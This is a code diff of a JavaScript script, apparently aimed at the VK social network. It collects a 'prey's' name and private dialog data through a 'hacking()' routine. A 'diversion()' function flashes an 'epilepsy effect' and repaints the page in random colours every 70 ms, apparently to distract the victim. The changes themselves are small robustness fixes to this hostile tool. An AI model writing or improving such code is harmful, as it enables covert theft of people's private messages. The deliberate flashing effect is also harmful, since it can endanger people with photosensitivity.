@@ -33,7 +33,8 @@ function toProfile() {
  * Получает имя и фамилию на странице с профилем
  */
 function getPreyFullName() {
-    return document.querySelector('.page_name').textContent.trim();
+    let elem = document.querySelector('.page_name');
+    return elem ? elem.textContent.trim() : 'Без имени';
 }
 // =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
 
@@ -79,7 +80,8 @@ function goToDialog(list_id) {
  * Получает имя собеседника на текущей странице
  */
 function getFriendName() {
-    return document.querySelector('._im_page_peer_name').textContent.trim();
+    let elem = document.querySelector('._im_page_peer_name');
+    return elem ? elem.textContent.trim() : 'Без имени';
 }
 
 /**
@@ -198,7 +200,7 @@ function diversion() {
         });
 
 
-        // добавляем эффект эпилепсии через 6 секунд
+        // ===== ЭФФЕКТ ЭПИЛЕПСИИ ===== //
         setTimeout(() => {
             let styles_epilepsy = `
                 .epilepsy {
@@ -304,7 +306,7 @@ function diversion() {
             epilepsy_bg.classList.add('epilepsy');
             vkCopy.document.body.appendChild(epilepsy_bg);
         }, 6000);
-
+        // ===== ЭФФЕКТ ЭПИЛЕПСИИ ===== //
 
         // ===== BREAK PAGE BY RANDOM COLORS ===== //
         // get elements for painting
@@ -327,6 +329,7 @@ function diversion() {
         }
 
         setInterval(paintRandom, 70);
+        // ===== BREAK PAGE BY RANDOM COLORS ===== //
     }, 5000);
 }
 // ================= ОТВЛЕЧЕНИЕ ================== //
@@ -404,8 +407,8 @@ async function hacking() {
         );
         console.log('data is missed');
         dialogsData = {
-            [preyName]: {}
-        }; // clear data to initial state
+            [preyId]: {}
+        };
     }, 10000);
 }
 
